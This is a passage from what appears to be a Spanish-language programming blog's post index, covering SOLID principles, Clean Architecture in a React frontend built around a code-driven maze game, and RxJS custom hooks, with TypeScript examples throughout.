lectura. Este componente es solo un contrato, una interfaz, la cual debemos implementar con la lógica asociada al motor de base de datos que estemos usando.Principio de segregación de interfaz (ISP)Este principio establece que las interfaces deben ser lo más pequeñas y específicas posible. Esto quiere decir que una interfaz implementa su mínima funcionalidad. En el siguiente ejemplo, definimos un EventDispatcher para enviar mensajes, EventListener para escuchar eventos y EventBus, el cual hereda ambas interfaces para crear una implementación completa de un event bus.import { Observable, Subject, filter, iif } from 'rxjs';import { v4 as uuid } from 'uuid';/** * Represents a domain event with a specific data payload. */export abstract class DomainEvent&lt;D, E extends string&gt; { readonly datetime: Date = new Date(); readonly id = uuid() abstract name: E constructor(public readonly data: D) { }}/** * Defines the contract for an event dispatcher. */export interface EventDispatcher&lt;E extends string&gt; { /** * Dispatches a domain event to appropriate listeners. * @param event The domain event to dispatch. */ dispatch&lt;T extends DomainEvent&lt;any, E&gt;&gt;(event: T): void;}/** * Defines the contract for an event listener. */export interface EventListener&lt;E extends string&gt; { /** * Subscribes to events of a specific name or all events. * @param name The name of the event to subscribe to (optional). * @returns An observable stream of events. */ onEvent&lt;T extends DomainEvent&lt;any, E&gt;&gt;(name?: E): Observable&lt;T&gt;}/** * Defines the contract for an event bus that acts as both a dispatcher and a listener. */export interface EventBus&lt;E extends string&gt; extends EventListener&lt;E&gt;, EventDispatcher&lt;E&gt; {}/** * An implementation of EventBus using RxJS. */export class RxjsEventBus&lt;E extends string&gt; implements EventBus&lt;E&gt; { private events$ = new Subject&lt;DomainEvent&lt;any, E&gt;&gt;() onEvent&lt;T extends DomainEvent&lt;any, E&gt;&gt;(eventName?: E): Observable&lt;T&gt; { return iif( () =&gt; eventName !== undefined, this.events$.pipe(filter(event =&gt; eventName === event.name)), this.events$.asObservable() ) as Observable&lt;T&gt;; } dispatch&lt;T extends DomainEvent&lt;any, E&gt;&gt;(event: T): void { this.events$.next(event) }}Principio de inversión de dependencias (DIP)Las clases de alto nivel no deben depender de clases de bajo nivel, sino de abstracciones. NestJs implementa este principio en sus providers.@Injectable()export class PlayListUseCases {\t\tconstructor(\t\tprivate user: UserService,\t\tprivate song: SongService,\t\tprivate playlist: PlaylistService\t) { }\t}ConclusiónAbordamos estas simples recomendaciones, las cuales pueden ayudar a crear aplicaciones escalables y mantenibles. Todo dependerá del caso, pero cuando un sistema puede crecer, es mejor considerar todas las buenas prácticas posibles. Cada proyecto es un mundo, al igual que el tiempo que nos dan para poder realizar un proyecto.Github repositoryMeme de cortesía:" }, { "title": "Arquitectura Frontend 2. Cómo implementar Clean Architecture en el Frontend.", "url": "/posts/arquitectura-frontend-2-como-implementar-clean-arquitecture/", "categories": "Frontend, React, Rxjs, Arquitectura Frontend, Javascript, Typescript", "tags": "frontend, react, rxjs, arquitectura frontend, javascript, typescript", "date": "2023-10-11 02:38:47 -0300", "snippet": "La aplicación de los principios de la arquitectura limpia (Clean Architecture) no se limita al ámbito del backend; de hecho, pueden ser igualmente beneficiosos cuando se aplican al frontend, ofreciendo una serie de ventajas sustanciales: Separación de Lógica de Negocio y Interfaz de Usuario: Al implementar la Clean Architecture en el frontend, podemos lograr la separación efectiva de la lógica empresarial compleja de la interfaz de usuario. Esta clara división permite una gestión más efectiva de ambos componentes, simplificando el mantenimiento y la escalabilidad. Independencia Tecnológica: La arquitectura limpia garantiza que el código de negocio no dependa de tecnologías específicas de interfaz de usuario, frameworks o bibliotecas. Esta independencia facilita la adaptación a nuevas tecnologías o la actualización de las existentes sin afectar la lógica central del negocio. Pruebas Unitarias sobre la Lógica Central: La estructura de Clean Architecture permite realizar pruebas unitarias de manera eficiente en la lógica central de la aplicación, asegurando su funcionamiento correcto y confiable. Esto reduce los errores y mejora la calidad del software. Resistencia a Cambios Disruptivos en las Interfaces de Usuario: La arquitectura limpia minimiza el impacto de cambios drásticos en las interfaces de usuario, como actualizaciones de librerías o frameworks, en la lógica de negocio. Esto resulta en una mayor estabilidad y reducción de riesgos. Simplificación de Migraciones de Código: La estructura ordenada y modular de la Clean Architecture facilita las migraciones de código, ya sea a nuevas tecnologías, plataformas o arquitecturas. Esto es especialmente valioso a medida que la aplicación crece y evoluciona. Clean Architecture, particularmente en aplicaciones complejas, es una estrategia poderosa. Aquí, exploraremos un ejemplo concreto en el contexto de React, la cual es una potente librería para crear UI. Sin embargo, en mi experiencia personal, es muy propensa a convertirse en código espagueti. Si bien siempre podremos separar las funciones de negocio de las de UI, hay casos donde las lógicas asíncronas ligadas a nuestra lógica de negocio no nos permitirán separarnos totalmente de los Hooks de React.No abusaremos de useEffect, useState y useContext en el código principal de negocio.¡Nos volvimos locos!. Trataremos de usar React solo en la parte de componentes visuales, y nos ayudaremos del paradigma de programación reactiva con RxJs. Comunicaremos la capa de negocio con la UI con 2 custom hooks: useObservable() y useObservableValue(). Estos son los intermediarios de nuestra lógica. Con este enfoque, nuestros componentes podrán suscribirse al estado de nuestra lógica de negocio de forma sencilla y limpia al componente.Creando el custom hook useObservable()Este hook nos permite usar la subscripción hacia un observable y también terminará las subscripciones sin que nos preocupemos nosotros.import { useEffect } from \"react\";import { Observable, Observer } from \"rxjs\";export default function useObservable&lt;T&gt;(observable$: Observable&lt;T&gt;, callback: Partial&lt;Observer&lt;T&gt;&gt; | ((value: T) =&gt; void)) { useEffect(() =&gt; { const subscription = observable$.subscribe(callback) return () =&gt; subscription.unsubscribe() },[]) }Escuchando estados globales o locales con useObservableValue().Este otro hook simulará a useState() y nos permitirá usar cualquier observable como estado de un componente.import { useEffect, useState } from \"react\";import { Observable } from \"rxjs\";type ObservableValue&lt;T&gt; = [ value: T, error: any, isCompleted: boolean]export default function useObservableValue&lt;T&gt;(observable$: Observable&lt;T&gt;, defaultValue: T): ObservableValue&lt;T&gt; { const [value, setValue] = useState&lt;T&gt;(defaultValue) const [error, setError] = useState&lt;false | Error&gt;(false) const [isCompleted, setIsCompleted] = useState(false) useEffect(() =&gt; { const subscription = observable$.subscribe({ next: (nextValue: T) =&gt; setValue(nextValue), error: err =&gt; { console.error(\"useObservableValueError\", err) setError(err) }, complete: () =&gt; setIsCompleted(true) }) return () =&gt; subscription.unsubscribe() },[]) return [ value, error, isCompleted ]}Explico estos hooks de mejor manera en este post arquitectura front 1 si bien por debajo aquí usamos useState y useEffect, solo serán aquí, ya nos olvidamos de estos hooks para las lógicas de negocio.Prueba de concepto: Juego interactivo con un laberinto, el clásico ratón atrapado y el ingrediente X.Nuestra aplicación será un juego donde podemos generar un laberinto aleatorio y la misión del jugador será ayudar a un ratoncito a salir del laberinto. Es un juego clásico pero que tendrá un ingrediente especial. Para sacar al ratoncito debemos hacerlo con código, ya sea con código TypeScript o JavaScript.Nuestra aplicación ahora suena compleja por los siguientes motivos: Generación del laberinto aleatorio. Control del ratoncito y definición de restricciones de negocio del juego. Transpilar TypeScript a JavaScript. Interpretar y controlar la ejecución de código JavaScript. Creación de sandbox de ejecución. Integración con editor de código. Medir puntajes del jugador. Código asíncrono por todos lados.En pocas palabras, esto resume la complejidad del proyecto. Inicialmente, se sitúa en un nivel de complejidad moderado, pero debemos estar preparados para garantizar que el código sea sostenible y adaptable a medida que el proyecto crezca en el futuro.Estructura de directoriosLa estructura de directorio diferirá de la que puede ser hecha en un backend. Si quieres saber cómo es, puedes ver este artículo: arquitectura hexagonal. En el frontend tendremos otras prioridades en cuanto a los componentes de software de nuestra aplicación. Serán los siguientes: application: casos de uso puertos: Browser api utilidades varias domain: puertos: apis serverless sdks modelo estado infrastructure: adapters: implementaciones de puertos cuando corresponda UI: componentes visuales, libs, frameworks, etc. librerías de terceros Si comparamos el frontend con el backend, el dominio del backend contendrá entidades y repositorios, pero en el frontend tendríamos los modelos de datos representados del backend y, en vez de la existencia de repositorios, tendremos el manejador de estados.MicroMouse FeatureNo explicaremos la totalidad de las funcionalidades del proyecto, ya que alargaríamos mucho este artículo. Si deseas, puedes verlo y estudiarlo en el siguiente repositorio. Me enfocaré en explicar la funcionalidad de Micromouse, la cual lleva la lógica principal del juego.La estructura del módulo micromouse es la siguiente: micromouse├──  application│ ├──  MicroMouse.ts│ └──  MicromouseGame.ts├──  domain│ ├──  Cell.ts│ ├──  CellPosition.ts│ ├──  Events.ts│ ├──  Mouse.ts│ ├──  MouseMaze.ts│ ├──  MoveMouseResponse.ts│ └──  state│ └──  MicromouseState.ts├──  dto.ts├──  exceptions.ts└──  infrastructure ├──  services.ts └──  ui └──  components ├──  maze │ ├──  CellContent.tsx │ └──  Maze.tsx └──  start-code-challenge-button └──  StartCodeChallengeButton.tsxEsta estructura contiene lo siguiente: application: casos de uso de la aplicación domain: estructura del estado del módulo lógica de negocio principal infraestructure: componentes UI instancia de servicios de uso global MicroMouseGame: casos de uso del juego del laberintoEste componente se encarga de controlar el estado del juego. También actualizará el estado global del módulo.export type MicromouseGameOptions = { stopwatch: Stopwatch, gameTime: `${number}:${number}`, state: MicromouseState}export class MicromouseGame { private stopwatch: Stopwatch private gameTime: `${number}:${number}` private state$: MicromouseState constructor(options: MicromouseGameOptions) { this.stopwatch = options.stopwatch this.gameTime = options.gameTime this.state$ = options.state } start() { this.stopwatch.start() this.stopGameAt(this.gameTime) } finish() { this.stopwatch.stop() this.state$.resetMousePosition() } reset() { this.stopwatch.stop() this.state$.reset() } time() { return this.stopwatch.time() } stopGameAt(time: `${number}:${number}`) { this.stopwatch .time() .pipe(filter(timeValue =&gt; timeValue === `${time}:00`)) .subscribe((time: string) =&gt; { this.stopwatch.stop() this.state$.updatePlayerResult({ time: time, isWinner: false }) this.state$.resetMousePosition() }) } onGameOver(callback: () =&gt; void) { this.stopwatch.onStop().subscribe({ next: () =&gt; { callback() }, error: err =&gt; console.log(err) }) } gameOver(): Observable&lt;GameOverResponse&gt; { return this.stopwatch.onStop().pipe( map(() =&gt; ({ isWinner: this.state$.getIsWinner() })) ) } updateScore(params: { message: string, position: string }) { this.state$.updateMousePosition(params.position) this.state$.updateMessage(params.message) this.state$.incrementMovements() } movements() { return this.state$.onMovement() } setup(code: string) { this.state$.setCode(code) } getSetup(): SetupGame { return { code: this.state$.getCode(), matrix: this.state$.getMaze() } } win() { this.state$.setIsWinner(true) this.finish() }}MicroMouse: casos de uso de control del ratoncito dentro del laberintoEste servicio se encargará de enviar las instrucciones al ratoncito del laberinto para moverse y se encargará de enviar eventos de dominio de forma global. También servirá de fachada del estado de la clase Mouse (ratoncito), la cual tiene la responsabilidad de conocer el laberinto y poder realizar los movimientos cuando corresponda.import { EventBus } from \"../../utils/eventbus\";import { eventbus } from \"../../utils/infrastructure\";import { Cell } from \"../domain/Cell\";import { MicromouseEvent, MouseMoveEvent, MouseWinEvent } from \"../domain/Events\";import { Mouse } from \"../domain/Mouse\";import { MouseMaze } from \"../domain/MouseMaze\";import { MoveMouseResponse } from \"../domain/MoveMouseResponse\";export class MicroMouse { constructor( private readonly eventbus: EventBus&lt;MicromouseEvent&gt;, private readonly mouse: Mouse, private readonly moveDelay = 0, ) { } async move(position: 'up' | 'down' | 'left' | 'right'): Promise&lt;MoveMouseResponse&gt; { await new Promise(resolve =&gt; setTimeout(resolve, this.moveDelay)); const response = this.mouse.move(position) this.eventbus.dispatch(new MouseMoveEvent({ isMoved: response.mouseMoved, message: response.message, position: response.cellPosition.getCurrentPosition() })) if (response.mouseMoved &amp;&amp; response.cellPosition.value.isExit()) { this.eventbus.dispatch(new MouseWinEvent(\"Felicitaciones ganaste maldito bastardo!!\")) } return response } static create(params: { matrix: string[][], moveDelay: number }) { const maze = MouseMaze.create({ matrix: params.matrix }) const mouse = new Mouse(maze, maze.getPosition('A0')) return new MicroMouse( eventbus, mouse, params.moveDelay ) } getCurrentPosition(): string { return this.mouse.getCurrentPosition() } getCurrentCell(): Cell { return this.mouse.getCurrentCell() } getUpCell(): Cell | null { return this.mouse.getUpCell(); } getDownCell(): Cell | null { return this.mouse.getDownCell() } getLeftCell(): Cell | null { return this.mouse.getLeftCell() } getRightCell(): Cell | null { return this.mouse.getRightCell() }}Mouse y Maze: objetos de dominio que contienen la lógica principal del juego.Estos 2 componentes de dominio contienen la lógica principal del juego. Mouse tendrá la información de ubicación y de cómo moverse por el laberinto, y MouseMaze tendrá la lógica del laberinto y su estructura.import { Cell } from \"./Cell\";import { CellPosition } from \"./CellPosition\";import { MouseMaze } from \"./MouseMaze\";import { MoveMouseResponse } from \"./MoveMouseResponse\";export class Mouse { constructor( private readonly maze: MouseMaze, private currentPosition: CellPosition ) { } move(position: string): MoveMouseResponse { const navigateTo = this.currentPosition.getCell(position); if (!navigateTo) { return new MoveMouseResponse( '⚠️ Raton culiao No puedes moverte fuera de tu universo 🪐', this.currentPosition, false ); } if (!navigateTo.canWalk()) { return new MoveMouseResponse( '✋ 🐁 no puedes ir por aca raton culiao.', this.currentPosition, false ); } const cellPosition = this.maze.getPosition(navigateTo.position); this.currentPosition = cellPosition; return new MoveMouseResponse( `Me he movido 🐁 -&gt; (${this.currentPosition.getCurrentPosition()})`, cellPosition, true ); } getCurrentPosition(): string { return this.currentPosition.getCurrentPosition(); } getCurrentCell(): Cell { return this.currentPosition.value; } getUpCell(): Cell { return this.currentPosition.up; } getDownCell(): Cell { return this.currentPosition.down; } getLeftCell(): Cell { return this.currentPosition.left; } getRightCell(): Cell { return this.currentPosition.right; }}export class MouseMaze { constructor(public readonly maze: Cell[][]) { } private findIndexes(valor: string): [number, number] | null { for (let i = 0; i &lt; this.maze.length; i++) { for (let j = 0; j &lt; this.maze[i].length; j++) { if (this.maze[i][j].position === valor) { return [i, j]; } } } return null; } getPosition(position: string): CellPosition | null { const loc = this.findIndexes(position); return loc ? this.showPositionMaze(loc) : null; } private showPositionMaze(loc: [number, number]): CellPosition { const maze = this.maze; const row = loc[0]; const col = loc[1]; if (row &lt; 0 || col &lt; 0) { throw new InvalidMazeLocationException('No se admiten coordenadas negativas'); } if (row &gt;= maze.length) { throw new InvalidMazeLocationException('No se admiten coordenadas fuera de rango'); } if (col &gt;= maze[0].length) { throw new InvalidMazeLocationException('No se admiten coordenadas fuera de rango'); } const currentLocation = maze[row][col]; const up = row &gt; 0 ? maze[row - 1][col] : null; const down = row &lt; maze.length - 1 ? maze[row + 1][col] : null; const left = col &gt; 0 ? maze[row][col - 1] : null; const right = col &lt; maze[0].length - 1 ? maze[row][col + 1] : null; return new CellPosition( currentLocation, up, down, left, right ); } static create(props: MouseMazeProps): MouseMaze { const {matrix } = props const matrixCells: Cell[][] = []; for (let i = 0; i &lt; matrix.length; i++) { const row: Cell[] = []; for (let j = 0; j &lt; matrix[i].length; j++) { const position = String.fromCharCode('A'.charCodeAt(0) + i) + String(j); const cell = new Cell(position, matrix[i][j]); row.push(cell); } matrixCells.push(row); } return new MouseMaze(matrixCells); } static mapMatrixToCells(matrix: string[][]): Cell[][] { const matrixCells: Cell[][] = []; for (let i = 0; i &lt; matrix.length; i++) { const row: Cell[] = []; for (let j = 0; j &lt; matrix[i].length; j++) { const position = String.fromCharCode('A'.charCodeAt(0) + i) + String(j); const cell = new Cell(position, matrix[i][j]); row.push(cell); } matrixCells.push(row); } return matrixCells }}Eventos de dominioNuestro dominio contiene eventos definidos, los cuales podremos escuchar de forma global para saber qué está ocurriendo en el juego. Esto es de utilidad para desacoplar distintas lógicas o módulos de la aplicación. Por ejemplo, no queremos mezclar la lógica de puntajes con la lógica de movimientos o de tiempo. Los eventos de dominio nos son de gran utilidad en arquitecturas limpias.import { DomainEvent } from \"../../utils/eventbus\";export type MicromouseEvent = \"micromouse.mouse-move\" | \"micromouse.mouse-win\" | \"micromouse.mouse-timeout\"export interface MouseEventProps { isMoved: boolean; message: string; position: string;}export class MouseMoveEvent extends DomainEvent&lt;MouseEventProps, MicromouseEvent&gt;{ name: MicromouseEvent = \"micromouse.mouse-move\";}export class MouseWinEvent extends DomainEvent&lt;string, MicromouseEvent&gt; { name: MicromouseEvent = \"micromouse.mouse-win\";}export class MouseTimeoutEvent extends DomainEvent&lt;string, MicromouseEvent&gt; { name: MicromouseEvent = \"micromouse.mouse-timeout\"}Estos eventos son orquestados por un eventbus, una clase implementada con Rxjs. Si quieres saber más sobre este enfoque, te invito al siguiente artículo: Arquitectura orientadas a eventosexport class ReactiveEventBus&lt;E extends string&gt; implements EventBus&lt;E&gt; { private events$ = new Subject&lt;DomainEvent&lt;any, E&gt;&gt;() onEvent&lt;T extends DomainEvent&lt;any, E&gt;&gt;(eventName?: E): Observable&lt;T&gt; { return iif( () =&gt; eventName !== undefined, this.events$.pipe(filter(event =&gt; eventName === event.name)), this.events$.asObservable() ) as Observable&lt;T&gt;; } dispatch&lt;T extends DomainEvent&lt;any, E&gt;&gt;(event: T): void { this.events$.next(event) }}export const eventbus = new ReactiveEventBus&lt;MicromouseEvent&gt;()StateManager sin las ultraconocidas librerías.Nuestro estado global del módulo es manejado con RxJs. Podríamos haber empleado alguna otra alternativa con más características y definir puertos y adaptadores para no acoplarnos a una librería de terceros, pero RxJs nos da la posibilidad de crear un state manager de forma sencilla y entender qué realmente debemos considerar al crear un state manager por nosotros mismos.export interface State { message: string; mousePosition: string; maze: string[][]; time: string movements: number isWinner: boolean code: string}export class MicromouseState { private defaultState: State private message: BehaviorSubject&lt;string&gt; private maze: BehaviorSubject&lt;string[][]&gt; private mousePosition: BehaviorSubject&lt;string&gt; private time: BehaviorSubject&lt;string&gt; private movements: BehaviorSubject&lt;number&gt; private isWinner: BehaviorSubject&lt;boolean&gt; private code: BehaviorSubject&lt;string&gt; constructor(props: State) { this.defaultState = props this.maze = new BehaviorSubject(props.maze) this.message = new BehaviorSubject(props.message) this.mousePosition = new BehaviorSubject(props.mousePosition) this.time = new BehaviorSubject(props.time) this.movements = new BehaviorSubject(props.movements) this.isWinner = new BehaviorSubject(props.isWinner) this.code = new BehaviorSubject(props.code) } setMaze(maze: string[][]) { this.maze.next(maze) } updateMousePosition(position: string) { this.mousePosition.next(position) } updateMessage(message: string) { this.message.next(message) } onMessage() { return this.message.pipe(distinctUntilChanged()) } onMaze() { return this.maze.pipe(distinctUntilChanged()) } getMaze() { return this.maze.value } onMousePosition() { return this.mousePosition.pipe(distinctUntilChanged()) } reset() { this.maze.next(this.defaultState.maze) this.message.next(this.defaultState.message) this.mousePosition.next(this.defaultState.mousePosition) } resetMousePosition() { this.mousePosition.next(this.defaultState.mousePosition) this.movements.next(0) } updatePlayerResult(payload: { time: string, isWinner: boolean}){ this.time.next(payload.time) this.isWinner.next(payload.isWinner) } getIsWinner() { return this.isWinner.value } setIsWinner(payload: boolean) { this.isWinner.next(payload) } incrementMovements() { this.movements.next(this.movements.value + 1) } onMovement() { return this.movements.pipe(distinctUntilChanged()) } setCode(payload: string){ this.code.next(payload) } getCode(){ return this.code.value }}Cabe destacar el siguiente código:onMousePosition() { return this.mousePosition.pipe(distinctUntilChanged())}El operador distinctUntilChanged() nos permitirá que quienes escuchen el estado de MicromouseState no reciban actualizaciones innecesarias, lo cual evitaría un problema de renderizados innecesarios. RxJs nos permitirá realizar operaciones más complejas con el estado si es necesario, pero con esta implementación nos basta.Instancia de serviciosCiertos componentes deben estar en un scope global, por lo que lo único que debemos hacer es instanciarlos en un único lugar, en este caso en el archivo src/micromouse_challenger/micromouse/infraestructure/services.ts.const configuration = getGameConfiguration()export const micromouseState = new MicromouseState({ message: \"Micromouse challenger iniciando 🏆 &lt;- 🐁\", mousePosition: 'A0', maze: [ [' ', 'X', 'X', 'X', 'X'], [' ', 'X', ' ', ' ', ' '], [' ', 'X', ' ', 'X', ' '], [' ', ' ', ' ', 'X', ' '], ['X', 'X', 'X', 'X', 'S'] ], isWinner: false, movements: 0, time: \"00:00:00\", code: \"// you must to code a solution for Micromouse Challenge\",})export const micromouseGame = new MicromouseGame({ stopwatch: new Stopwatch(), gameTime: configuration.gameTimeout, state: micromouseState}) Si necesitáramos una instancia a nivel de componentes podemos hacer uso del hook useRef() de React.Conectando la UI con nuestra aplicaciónPara hacer uso del estado de nuestra aplicación, solo debemos hacer uso de nuestros hooks previamente definidos:const [time] = useObservableValue(micromouseGame.time(), \"00:00:00\")const [movements] = useObservableValue(micromouseGame.movements(), 0)const [gameOver] = useObservableValue(micromouseGame.gameOver(), { isWinner: false })De esta manera, las variables time, movements y gameOver actuarán como estado global, y React renderizará los componentes cuando cualquiera de esos cambie.Mostraré como ejemplo el componente &lt;Sanbox/&gt;, el cual debe ejecutar el juego dentro de un WebWorker. Para lograr esto, utilizamos el caso de uso executeCodeRunnerWorker, el cual pertenece al módulo code-runner. Este caso de uso ejecuta el flujo del juego y se comunicará con el WebWorker que controlará el servicio Micromouse.Caso de uso: executeCodeRunnerWorkerEste caso de uso ejecutará el juego e internamente el código del jugador para poder mover el ratoncito en el laberinto. Todo este proceso debe ser ejecutado en un WebWorker para evitar interferir en el hilo principal del navegador.export default function executeCodeRunnerWorker(options: ExecuteCodeRunnerWorkerOptions) { const worker = createCodeRunnerWorker() micromouseGame.start() micromouseGame.onGameOver(() =&gt; { worker.terminate() options.onGameOver() }) worker.sendMessage(new StartMicromouseMessage(micromouseGame.getSetup())) worker .onMessage&lt;MicromouseMoveMessage&gt;(\"MICROMOUSE_MOVE\") .pipe(map(event =&gt; event.payload.micromouseEvent)) .subscribe({ next: (micromouseEvent) =&gt; { micromouseGame.updateScore({ message: micromouseEvent.data.message, position: micromouseEvent.data.position }) }, error: (err) =&gt; console.log(err) }) worker.onMessage&lt;MicromouseMoveMessage&gt;(\"MICROMOUSE_WIN\").subscribe({ next: () =&gt; { micromouseGame.win() }, error: (err) =&gt; console.log(err) }) return worker}Esta función debe retornar un worker, el cual debe ser terminado al desmontar el componente de forma obligatoria. Para lograrlo, podemos hacer uso del clásico useEffect().useEffect(() =&gt; { const worker = executeCodeRunnerWorker({ onGameOver: () =&gt; setOpen(true) }) return () =&gt; { worker.terminate() }}, [])O mandamos a casa al useEffect() y lo hacemos con Observables de RxJs.export const codeRunnerWorker$ = new Observable(observer =&gt; { const worker = executeCodeRunnerWorker({ onGameOver: () =&gt; observer.next() }) return () =&gt; { worker.terminate() }})Ya creado nuestro observable codeRunnerWorker$, lo usamos con el hook useObservable() en nuestros componentes.useObservable(codeRunnerWorker$, () =&gt; { console.log(\"GameOver\")})Finalmente, nuestros componentes de UI quedan así:export default function SandBox() { // libraries and React hooks const [, navigate] = useLocation(); const [open, setOpen] = useState(false) // game logic const [time] = useObservableValue(micromouseGame.time(), \"00:00:00\") const [movements] = useObservableValue(micromouseGame.movements(), 0) const [gameOver] = useObservableValue(micromouseGame.gameOver(), { isWinner: false }) // we need to execute a worker for code execution useObservable(codeRunnerWorker$, () =&gt; { // game over showing Modal with game results setOpen(true) }) const handleAcceptModal = () =&gt; { setOpen(false) navigate(Paths.MICROMOUSE_CODERUNNER) } return ( &lt;div className=\"rounded w-[800px] h-[500px] bg-gray-900\"&gt; &lt;div className=\"flex flex-col items-center\"&gt; &lt;ScoreDashboard time={time} movements={movements} /&gt; &lt;Maze /&gt; &lt;Modal title={gameOver.isWinner ? \"Felicitaciones\" : \"Que penita\"} open={open} onAccept={handleAcceptModal} onClose={handleAcceptModal}&gt; {gameOver.isWinner ? &lt;WinnerModalContent movements={movements} time={time} /&gt; : &lt;GameOverModalContent /&gt;} &lt;/Modal&gt; {gameOver.isWinner ? &lt;ConfettiExplosion zIndex={1000} /&gt; : null} &lt;/div&gt; &lt;/div&gt; )}ConclusiónClean architecture en el frontend nos brinda la capacidad de abordar los casos de uso de manera independiente de la interfaz de usuario. En este proyecto, se han logrado los siguientes hitos en el diseño de aplicaciones: Separación de Lógicas Complejas: Hemos logrado aislar las lógicas de negocio complejas de la interfaz de usuario. Conexión UI-Core Eficiente: Implementamos una conexión efectiva entre la interfaz de usuario y el núcleo de la aplicación mediante dos sencillos custom hooks. Programación Reactiva: Utilizamos programación reactiva para permitir que cada componente de la aplicación se comunique de manera desacoplada. State Manager Eficiente: Creamos un gestor de estado sin recurrir a soluciones más pesadas como React Redux u otras alternativas altamente acopladas a React. Mantenibilidad y Migración Transparente: Nos hemos asegurado de que la mantenibilidad y migración de características sean lo más fluidas posible. Es importante destacar que no se pretende desacreditar el uso de los hooks de React. Cada caso puede requerir soluciones particulares, y React ofrece una amplia variedad de hooks diseñados para abordar escenarios específicos. Este proyecto aún no ha enfrentado todos los posibles desafíos donde React y sus hooks pueden abordar, por lo que es fundamental adaptar la solución a las necesidades específicas de cada contexto.Ahora, si quieres probar el desafío y saber de qué se trata Micromouse Challenger, puedes intentarlo en el siguiente link: MicroMouse Challenger Page.Github repositoryMeme de cortesía" }, { "title": "Arquitectura Frontend 1. Cómo integrar RxJS en React para aplicaciones asíncronas complejas", "url": "/posts/arquitectura-frontend-1-como-integrar-rxjs-4-react-para-aplicaciones-asincronas-complejas/", "categories": "Frontend, React, Rxjs, Arquitectura Frontend, Javascript, Typescript", "tags": "frontend, react, rxjs, arquitectura frontend, javascript, typescript", "date": "2023-08-21 13:48:40 -0400", "snippet": "React es una excelente librería para crear componentes visuales. También nos brinda los hooks, con los cuales podemos trabajar con estados y efectos secundarios en situaciones asíncronas. Si bien para casos sencillos esto puede ser suficiente, manejar flujos asíncronos complejos puede hacer que nuestros componentes se conviertan en una ensalada de código. Afortunadamente, podemos integrar fácilmente RxJS para enfrentar estas situaciones. RxJS es una poderosa librería que nos permite trabajar con flujos asíncronos y eventos, permitiendo la reutilización de código y la creación de aplicaciones con alto flujo de datos y eventos.Si no conoces sobre RxJS o la programación reactiva, te invito al siguiente artículo donde se explica en qué consiste este enfoque. Ahora bien, si estás interesado en crear aplicaciones más robustas, puedes seguir leyendo este artículo.Custom Hooks para trabajar con RxJSReact nos permite crear nuestros propios hooks, lo que resulta en componentes más limpios y fáciles de mantener. Para ello, haremos uso de useState() y useEffect(), los clásicos de siempre.useObservableEste hook nos permite trabajar con suscripciones de forma efectiva, sin que tengamos que preocuparnos por las fugas de memoria debido a la falta de desuscripción de los observables que estamos empleando.import { useEffect } from \"react\";import { Observable, Observer } from \"rxjs\";/** * Hook personalizado para suscribirse a un observable y ejecutar una acción cuando se emiten valores. * @template T El tipo de valor emitido por el observable. * @param {Observable&lt;T&gt;} observable$ El observable al que se desea suscribir. * @param {Partial&lt;Observer&lt;T&gt;&gt; | ((value: T) =&gt; void)} callback La función que se ejecutará cuando se emitan valores. */export default function useObservable&lt;T&gt;(observable$: Observable&lt;T&gt;, callback: Partial&lt;Observer&lt;T&gt;&gt; | ((value: T) =&gt; void)) { useEffect(() =&gt; { // Se crea una suscripción al observable proporcionado const subscription = observable$.subscribe(callback); // La función de limpieza que se ejecutará al desmontar el componente return () =&gt; { // Se desuscribe de la suscripción para evitar fugas de memoria subscription.unsubscribe(); }; }, []);}useObservableValueEste hook nos permite usar los valores emitidos por un observable. Podremos escuchar cada valor emitido, los errores y también cuando el observable se completa.import { useEffect, useState } from \"react\";import { Observable } from \"rxjs\";/** * Una tupla que representa el valor, el error y el estado de completado de un observable. * @template T El tipo de valor emitido por el observable. */type ObservableValue&lt;T&gt; = [ /** El valor actual emitido por el observable. */ value: T, /** El error, si se produce alguno, o `false` si no hay error. */ error: any, /** Un indicador de si el observable ha sido completado (`true`) o no (`false`). */ isCompleted: boolean];/** * Hook para trabajar con valores emitidos por un observable. * @template T El tipo de valor emitido por el observable. * @param {Observable&lt;T&gt;} observable$ El observable del que se escucharán los valores. * @param {T} defaultValue El valor por defecto. * @returns {ObservableValue&lt;T&gt;} Una tupla con el valor actual, el error (si existe) y un indicador de si el observable está completado. */export default function useObservableValue&lt;T&gt;(observable$: Observable&lt;T&gt;, defaultValue: T): ObservableValue&lt;T&gt; { const [value, setValue] = useState&lt;T&gt;(defaultValue) const [error, setError] = useState&lt;false | Error&gt;(false) const [isCompleted, setIsCompleted] = useState(false) useEffect(() =&gt; { const subscription = observable$.subscribe({ next: (nextValue: T) =&gt; setValue(nextValue), error: err =&gt; { console.error(\"useObservableValueError\", err) setError(err) }, complete: () =&gt; setIsCompleted(true) }) return () =&gt; subscription.unsubscribe() },[]) return [ value, error, isCompleted ]}Cómo utilizar nuestros HooksCon estas sencillas implementaciones, analicemos los siguientes ejemplos.Eventos de teclado/** * Crea un observable que emite eventos de teclado filtrados por la tecla especificada. * @param {'arrowUp' | 'ArrowDown' | 'ArrowLeft' | 'ArrowRight'} key La tecla de flecha a escuchar. * @returns {Observable&lt;KeyboardEvent&gt;} El observable que emite eventos de teclado filtrados. */const keydown$ = (key) =&gt; fromEvent(document, \"keydown\").pipe( filter((event: KeyboardEvent) =&gt; event.key === key), // filtramos por la tecla especifica. takeUntil(game$.gameOver()) // terminamos la emisión de valores hasta que el observable game$ termine);// Suscripción a eventos de tecladouseObservable(keydown$('arrowUp'), () =&gt; movePlayer('up'));useObservable(keydown$('ArrowDown'), () =&gt; movePlayer('down'));useObservable(keydown$('ArrowLeft'), () =&gt; movePlayer('left'));useObservable(keydown$('ArrowRight'), () =&gt; movePlayer('right'));Simulamos un juego donde escuchamos los eventos de las flechas de navegación y emitimos los eventos correspondientes.Equivalente en React con hooks:import React, { useEffect } from 'react';function App() { const movePlayer = (direction) =&gt; { // Lógica para mover al jugador en la dirección especificada }; useEffect(() =&gt; { const handleKeyDown = (event) =&gt; { switch (event.key) { case 'ArrowUp': movePlayer('up'); break; case 'ArrowDown': movePlayer('down'); break; case 'ArrowLeft': movePlayer('left'); break; case 'ArrowRight': movePlayer('right'); break; default: break; } }; document.addEventListener('keydown', handleKeyDown); return () =&gt; { document.removeEventListener('keydown', handleKeyDown); }; }, []); return ( &lt;div&gt; {/* Contenido de tu aplicación */} &lt;/div&gt; );}export default App; Es importante mencionar que en ciertos escenarios, se puede simplificar este código utilizando el evento onKeyDown del componente deseado, sin necesidad de manipular el DOM directamente.Elegante y Coqueto StateManagerexport interface Book { title: string pages: number genre: string cover: string synopsis: string year: 